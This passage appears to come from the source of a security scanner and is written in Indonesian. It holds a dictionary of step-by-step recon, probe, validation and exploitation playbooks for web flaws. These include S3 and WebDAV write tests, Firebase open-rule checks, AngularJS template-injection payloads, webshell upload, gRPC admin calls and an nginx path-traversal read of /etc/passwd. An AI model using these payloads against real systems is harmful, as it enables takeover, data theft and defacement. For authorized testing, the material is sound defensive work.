        "Validasi: server tetap redirect ke domain attacker dengan code -> whitelist rusak.",
        "Eksploitasi: korban login -> code dikirim ke attacker -> exchange jadi access token.",
        "Impact: takeover akun korban via OAuth.",
    ],
    "s3_world_writable": [
        "Recon: temukan bucket dari source HTML / DNS (`*.s3.amazonaws.com`).",
        "Probe: `aws s3 ls s3://{host} --no-sign-request`. Bila list -> public read.",
        "Probe write: `aws s3 cp /tmp/cyblok.txt s3://{host}/cyblok-poc.txt --no-sign-request`.",
        "Validasi: GET balasan file sama -> public WRITE.",
        "Eksploitasi: ganti `index.html`, `.js`, atau aset CDN -> defacement / supply-chain XSS.",
        "Impact: serang seluruh pengguna situs lewat asset terdistribusi -> kepercayaan brand hancur.",
    ],
    "firebase_open_db": [
        "Recon: cari URL `https://<project>.firebaseio.com` di JS bundle.",
        "Probe: GET `<project>.firebaseio.com/.json`.",
        "Validasi: 200 + JSON penuh -> rules `\".read\":true`.",
        "Probe write: PUT `<project>.firebaseio.com/cyblok.json` body `\"poc\"`.",
        "Validasi: 200 -> rules `\".write\":true`.",
        "Impact: seluruh database realtime publik baca + tulis -> manipulasi data + kebocoran masif.",
    ],
    "csti_template": [
        "Identifikasi aplikasi AngularJS / Vue (cari `ng-app`, `{{` di HTML).",
        "Probe: tambahkan `?q={{{{7*7}}}}` di parameter yang reflektif.",
        "Validasi: HTML memuat `49` (bukan literal `{{7*7}}`) -> client-side template injection.",
        "Eksploitasi AngularJS: `{{{{constructor.constructor('alert(1)')()}}}}` -> XSS bypass CSP.",
        "Impact: XSS persisten yang lolos CSP standar -> session theft.",
    ],
    "api_version_downgrade": [
        "Recon: dapat path API saat ini dari mobile bundle / JS.",
        "Probe: `/api/v0/`, `/api/v1/`, `/api/old/`, `/api/legacy/` untuk endpoint sensitif.",
        "Validasi: endpoint lama balas data tanpa Authorization -> kontrol akses lemah di versi lama.",
        "Eksploitasi: panggil `/api/v1/users/me` tanpa token -> dapat profile siapa pun.",
        "Impact: bypass auth menyeluruh via versi API yang dikira sudah dimatikan.",
    ],
    "grpc_reflection": [
        "Probe: `grpcurl -plaintext {host}:443 list`.",
        "Validasi: server balas daftar service (mis. `user.UserService`) -> reflection aktif.",
        "Enumerate metode: `grpcurl describe user.UserService`.",
        "Eksploitasi: panggil method admin (DeleteUser, GrantRole) tanpa autentikasi.",
        "Impact: full backdoor admin via gRPC tanpa harus reverse-engineering proto.",
    ],
    "saml_metadata_exposed": [
        "Probe: GET `/saml/metadata`, `/Shibboleth.sso/Metadata`, `/simplesaml/saml2/idp/metadata.php`.",
        "Validasi: response XML berisi entityID + signing cert -> metadata terbuka.",
        "Recon: dari metadata dapat AssertionConsumerService URL, cert publik, format ID.",
        "Pivot: pakai metadata untuk siapkan SAML Response forge (chain ke XSW / signature wrapping).",
        "Impact: persiapan login forge sebagai user mana pun di SP -> takeover.",
    ],
    "webdav_writable": [
        "Probe: OPTIONS `/` -> Allow header berisi PROPFIND/PUT/MKCOL.",
        "Validasi PROPFIND: PROPFIND `/` Depth: 1 -> response 207 + listing.",
        "Probe write: PUT `/cyblok.txt` body `CYBLOK_WEBDAV`.",
        "Validasi: GET `/cyblok.txt` balas isi sama -> WRITE confirmed.",
        "Eksploitasi: PUT `cyblok.aspx` (IIS) atau `cyblok.jsp` (Tomcat) -> akses URL = RCE.",
        "Impact: webshell upload langsung -> total takeover server.",
    ],
    "nginx_off_by_slash": [
        "Recon: identifikasi Nginx + path alias (mis. `/static/...`).",
        "Probe: kirim `{url}/static../etc/passwd` (tanpa slash setelah `static`).",
        "Validasi: response 200 + isi `/etc/passwd` -> alias dikonfigurasi `alias /var/www/static;` (tanpa trailing slash) = vuln.",
        "Eksploitasi: baca config aplikasi, .env, kunci SSH user www-data.",
        "Impact: file disclosure tingkat critical -> kredensial DB & cloud bocor.",
    ],
}
